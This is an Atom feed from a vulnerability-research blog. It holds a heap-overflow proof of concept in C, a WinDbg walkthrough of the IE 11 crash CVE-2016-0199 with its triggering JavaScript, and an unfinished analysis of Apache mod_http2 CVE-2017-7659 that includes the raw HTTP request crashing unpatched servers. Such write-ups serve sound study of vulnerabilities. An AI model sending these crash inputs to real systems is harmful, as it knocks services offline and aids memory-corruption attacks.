<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnerability | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulnerability/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2018-05-31T15:56:59-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Heap Overflow]]></title>
    <link href="http://wg135.github.io/blog/2018/05/22/heap-overflow/"/>
    <updated>2018-05-22T15:11:44-05:00</updated>
    <id>http://wg135.github.io/blog/2018/05/22/heap-overflow</id>
    <content type="html"><![CDATA[<h3>0x0 Enviroment:</h3>

<ul>
<li>Windows 7 SP1 32-bit</li>
<li>Windbg</li>
</ul>


<!--more-->


<h3>0x1 POC (from vulnerability war):</h3>

<pre><code class="C">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

int main ( )
{
    HANDLE hHeap;
    char *heap;
    char str[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    hHeap = HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0x1000, 0xffff);
    getchar();  // halt, attach to process

    heap = HeapAlloc(hHeap, 0, 0x10);
    printf("heap addr:0x%08x\n",heap);

    strcpy(heap,str);   //  heap overflow
    HeapFree(hHeap, 0, heap);   // crash

    HeapDestroy(hHeap);
    return 0;
}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2016-0199]]></title>
    <link href="http://wg135.github.io/blog/2018/05/15/cve-2016-0199/"/>
    <updated>2018-05-15T15:02:16-05:00</updated>
    <id>http://wg135.github.io/blog/2018/05/15/cve-2016-0199</id>
    <content type="html"><![CDATA[<h3>0x0 Enviroment:</h3>

<ul>
<li>Windows 7 SP1 32-bit</li>
<li>IE 11</li>
<li>Windbg</li>
</ul>


<!--more-->


<h3>0x1 POC:</h3>

<p>```html
<meta http-equiv="X-UA-Compatible" content="IE=7"></p>

<script>
oElement = document.createElement("IMG");
var oAttr = document.createAttribute("loop");
oAttr.nodeValue = oElement;
oElement.loop = 0x41424344;
oElement.setAttributeNode(oAttr);
oElement.removeAttributeNode(oAttr);
CollectGarbage();
</script>


<pre><code>
###0x2 Vulnerability Reproduce

Run the poc and get crash in windbg:

<img src="/images/blog/vulnerability/cve_2016_0199/1.PNG" title="[title manually exploit [alt text]]" >

Here we get Access violation exception
</code></pre>

<p>jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252:
695b0de2 8b30            mov     esi,dword ptr [eax]  ds:0023:41424344=????????
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Next we need to locate this code in jscript9.dll in IDA Pro. The address is 0x695b0de2 and we need to get base address of this DLL:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;code&gt;lmvm jscript9&lt;/code&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;lmvm &lt;module&gt; - Dumps information about the module. Remember to use &lt;module&gt; and not &lt;module.dll&gt;.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<img src="/images/blog/vulnerability/cve_2016_0199/2.PNG" title="[title manually exploit [alt text]]" >&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;start address is 0x693b0000, so the address we want to check in IDA Pro is :&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;code&gt;2:051&gt; ? 695b0de2 - 693b0000 + 10000000&lt;/code&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<img src="/images/blog/vulnerability/cve_2016_0199/3.PNG" title="[title manually exploit [alt text]]" >&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;so the address is 0x 10200de2.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;In IDA Pro, locate the code:
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/4.PNG" title="[title manually exploit [alt text]]" >&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;based on the code:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;.text:10200DE2                 mov     esi, [eax]
</span><span class='line'>.text:10200DE4                 mov     ecx, [esi+44h]  ; void *
</span><span class='line'>.text:10200DE7                 call    ds:___guard_check_icall_fptr
</span><span class='line'>.text:10200DED                 call    dword ptr [esi+44h
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;we can guess, eax has C++ object base address and that address -4 should contain vtable address. To verifiy the assumption. Modify the PoC:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;```html
</span><span class='line'>&lt;meta http-equiv="X-UA-Compatible" content="IE=7"&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;script&gt;
</span><span class='line'>alert(0);
</span><span class='line'>oElement = document.createElement("IMG");
</span><span class='line'>alert(1);
</span><span class='line'>var oAttr = document.createAttribute("loop");
</span><span class='line'>alert(2);
</span><span class='line'>oAttr.nodeValue = oElement;
</span><span class='line'>alert(3);
</span><span class='line'>CollectGarbage();
</span><span class='line'>&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;We want to set break point at jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252
</span><span class='line'>
</span><span class='line'>however, since the dll is not loaded when we restart debugging. We can use windbg command `sxe ld:modulename` command to break when jscript9.dll first time load, and then we can set the breakpoint on that address.
</span><span class='line'>
</span><span class='line'>`sxe ld:jscript9`
</span><span class='line'>`lmm jscript9`
</span><span class='line'>`bp jscript9!JavascriptThreadService::EnumerateTrackingClient+0x59252`
</span><span class='line'>`bl`
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/5.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>As you can see, we get the vtable address.
</span><span class='line'>
</span><span class='line'>Next rewrite the poc:
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=7"&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;script&gt;
</span><span class='line'>alert(0);
</span><span class='line'>oElement = document.createElement("IMG");
</span><span class='line'>alert(1);
</span><span class='line'>var oAttr = document.createAttribute("loop");
</span><span class='line'>alert(2);
</span><span class='line'>oAttr.nodeValue = oElement;
</span><span class='line'>alert(3);
</span><span class='line'>oElement.loop = 0x41424344;
</span><span class='line'>alert(4);
</span><span class='line'>oElement.setAttributeNode(oAttr);
</span><span class='line'>alert(5);
</span><span class='line'>oElement.removeAttributeNode(oAttr);
</span><span class='line'>alert(6);
</span><span class='line'>CollectGarbage();
</span><span class='line'>&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;
</span><span class='line'>The poc create IMG object and attribute loop.So we need to find out these two addresss. First of all, set hpa and ust
</span><span class='line'>
</span><span class='line'>`gflags /i iexplore.exe +hpa +ust`
</span><span class='line'>
</span><span class='line'>Then use IE to open poc file, and attach to windbg,
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/7.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>and use `x MSHTML!CImgElement::*` to list all clmgelement functions
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/6.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>CreateElement function will create object. set breakpoint here and run
</span><span class='line'>
</span><span class='line'>`bp MSHTML!CImgElement::CreateElement; g`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/8.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>Click messagebox in webpage and we hit the breakpoint:
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/9.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>step in `p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/10.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>`p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/11.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>`p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/12.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>`p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/13.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>`p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/14.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>`p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/15.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>`p`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/16.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>HeapAlloc creates a buffer, size is 0x5c and the address is in eax, 0x0d524fa0.
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/17.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>Address 0x0d524fa0 will be IMG object's address. But why?
</span><span class='line'>
</span><span class='line'>Keep going on
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>a few `p`s
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/18.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>since before calling MSHTML!CImgElement::CImgElement, ecx contains eax value 0d524fa0
</span><span class='line'>
</span><span class='line'>Use `dps` command (display pointers and symbols):
</span><span class='line'>
</span><span class='line'>`dps 0d524fa0`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/19.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>This is vtable address.
</span><span class='line'>
</span><span class='line'>next try to search Attribute object base address
</span><span class='line'>
</span><span class='line'>`MSHTML!CAttribute::*`
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/20.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>It is a constructor function. Put a breakpoint here.
</span><span class='line'>
</span><span class='line'>`bp MSHTML!CAttribute::CAttribute`
</span><span class='line'>
</span><span class='line'>and `g`, will hit alert(1); in poc. click ok.
</span><span class='line'>
</span><span class='line'>keep step in and reach here:
</span><span class='line'>
</span><span class='line'><img src="/images/blog/vulnerability/cve_2016_0199/21.PNG" title="[title manually exploit [alt text]]" >
</span><span class='line'>
</span><span class='line'>so attribute object base address in ebx and its value is 0x0d5a2fa0
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>so address of IMG is 0x0d524fa0 address of Attribute is 0x0d5a2fa0.
</span><span class='line'>
</span><span class='line'>Back to PoC:
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;oAttr.nodeValue = oElement;</span></code></pre></td></tr></table></div></figure>
This line will assign an IMG object to a memeber of the attribute object. Lets search which function can do this:</p>

<p><code>x MSHTML!CAttribute::*</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/22.PNG" title="[title manually exploit [alt text]]" ></p>

<p>seems <code>MSHTML!CAttribute::put_nodeValue</code> can do this. set the breakpoint:</p>

<p><code>bp MSHTML!CAttribute::put_nodeValue</code> and go</p>

<p>click ok</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/23.PNG" title="[title manually exploit [alt text]]" ></p>

<p>and we reach MSHTML!CAttribute::put_nodeValue:</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/24.PNG" title="[title manually exploit [alt text]]" ></p>

<p>check the call stack:</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/25.PNG" title="[title manually exploit [alt text]]" ></p>

<p>do <code>dps 0d5a2fa0</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/26.PNG" title="[title manually exploit [alt text]]" ></p>

<p>Seems the breakpoint is correct. put_nodeValue seems the entry of the assignment. Keep going.</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/27.PNG" title="[title manually exploit [alt text]]" ></p>

<p>use command <code>t</code> to trace down</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/37.PNG" title="[title manually exploit [alt text]]" ></p>

<p>do <code>dps 0d5a2fa0</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/28.PNG" title="[title manually exploit [alt text]]" ></p>

<p>now we  can see, IMG object address is copied to attribute object and offset is 0x30</p>

<p>next in POC:</p>

<pre><code>oElement.loop = 0x41424344;
</code></pre>

<p>We want to locate the address of this code, first of all,</p>

<p>do <code>s-d 0x0 L?0x7fffffff 41424344</code> to find the 41424344 and then execute the code and find the extra one, that should be the address of the 41424344 in the poc code.</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/29.PNG" title="[title manually exploit [alt text]]" ></p>

<p>then keep goin, press <code>g</code> and after alert(4) popup,</p>

<p>do <code>s-d 0x0 L?0x7fffffff 41424344</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/30.PNG" title="[title manually exploit [alt text]]" ></p>

<p>we have new address 0x14162fc8</p>

<p><code>!heap -p -a 14162fc8</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/31.PNG" title="[title manually exploit [alt text]]" ></p>

<p>we found useraddr is 14162fc0, so the memory is allocated from 14162fc0 and 41424344' address is 8 bytes behind it.</p>

<p>set bp</p>

<p><code>bp MSHTML!CImplAry::EnsureSizeWorker+0x00000063</code></p>

<p>HeapAlloc assign memory, the address is 12fd1fc0</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/32.PNG" title="[title manually exploit [alt text]]" ></p>

<p>step in and check edi:</p>

<p><code>dps edi</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/33.PNG" title="[title manually exploit [alt text]]" ></p>

<p>now remember IMG object address is 0x0d524fa0</p>

<p>the whole process is :</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/34.png" title="[title manually exploit [alt text]]" ></p>

<p>back to POC:</p>

<pre><code>oElement.setAttributeNode(oAttr);
</code></pre>

<p>do <code>x mshtml!CElement::setAttributeNode</code></p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/35.PNG" title="[title manually exploit [alt text]]" ></p>

<p>set bp:
<code>bp mshtml!CElement::setAttributeNode</code></p>

<p>and finally got:</p>

<p><img src="/images/blog/vulnerability/cve_2016_0199/36.PNG" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2017-7659 Apache Vulnerability Reproduce]]></title>
    <link href="http://wg135.github.io/blog/2017/07/18/cve-2017-7659-apache-vulnerability-reproduce/"/>
    <updated>2017-07-18T10:41:52-05:00</updated>
    <id>http://wg135.github.io/blog/2017/07/18/cve-2017-7659-apache-vulnerability-reproduce</id>
    <content type="html"><![CDATA[<p>Apache released fix for CVE-2017-7659 last month. It is a mod_http2 Null Pointer Dereference vulnerability. Here is my analysis.</p>

<!--more-->


<p>First check the patch for this vulnerability:</p>

<p><code>https://github.com/apache/httpd/commit/672187c168b94b562d8065e08e2cad5b00cdd0e3</code></p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture1.PNG" title="[title manually exploit [alt text]]" ></p>

<p>As we can see, fix just add check return value of function h2_request_rcreate.</p>

<h2>reproduce:</h2>

<p>First, download apache version 2.4.25: <a href="https://archive.apache.org/dist/httpd/httpd-2.4.25.tar.gz.">https://archive.apache.org/dist/httpd/httpd-2.4.25.tar.gz.</a> compile it and enable http2. I wrote a bash script to do download and configure it. After that use curl to verify if http2 is ready to go</p>

<p><code>curl -v --http2 http://192.168.79.136</code></p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture2.PNG" title="[title manually exploit [alt text]]" ></p>

<p>when you see HTTP/1.1 101 Switching Protocols, that means http2 is good to go.</p>

<p>now in burp send http request:</p>

<pre><code>GET / HTTP/1.0
User-Agent: curl/7.47.0
Accept: */*
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__
</code></pre>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture3.PNG" title="[title manually exploit [alt text]]" ></p>

<p>The server doesn&rsquo;t response.</p>

<h2>Analysis</h2>

<p>First check vulnerable function h2_stream_set_request_rec (in httpd-2.4.25/modules/http2/h2_stream.c)</p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture4.PNG" title="[title manually exploit [alt text]]" ></p>

<p>function h2_stream_set_request_rec calls h2_request_rcreat is used to create http 2.0 request. req will be null when h2_request_rcreat fails.
In this situation, log function ap_log_rerror will use req which leads process crash.</p>

<p>next, exam function h2_request_rcreate (in httpd-2.4.25/modules/http2/h2_request.c).</p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture5.PNG" title="[title manually exploit [alt text]]" ></p>

<p>it will set req vaule as NULL, then it will check value of r->method, scheme, r->hostname, path. If any of them is null will return fail. However, at this moment, req vaule is 0 which leads to crash.</p>

<p>Method, scheme and path are checked. So r->hostname is our winner.</p>

<p>in HTTP request, there are two methods can have host name.</p>

<p>(1) in URL. Like: <a href="http://fuckyou.com/shit.html.">http://fuckyou.com/shit.html.</a> Function ap_parse_uri will handle host value in this request.
(2) in HTTP header. Function fix_hostname will handle this.</p>

<p>check function ap_read_request (in httpd-2.4.25/server/protocol.c)</p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture6.PNG" title="[title manually exploit [alt text]]" ></p>

<p>if r->hostname is empty and http request version is great than 1.1 or http version == 0 without host will return http400. But it doesn&rsquo;t check one situation: when http version is 1.0 and without hostname value. That is the problem.</p>

<h2>Debug</h2>

<p>See reference how to debug apache: <a href="https://httpd.apache.org/dev/debugging.html">https://httpd.apache.org/dev/debugging.html</a></p>

<p>set break point in function ap_read_request,</p>

<p>run the poc. it will hit break point at ap_read_request, h2_stream_set_request_rec</p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture7.PNG" title="[title manually exploit [alt text]]" ></p>

<p>continue, it will hit break point at h2_stream_set_request_rec</p>

<p><img src="/images/blog/vulnerability/cve_2017_7659/Capture8.PNG" title="[title manually exploit [alt text]]" ></p>

<p>as we can see, it is in mod_http2.so.</p>

<p>(not finish)</p>
]]></content>
  </entry>
  
</feed>
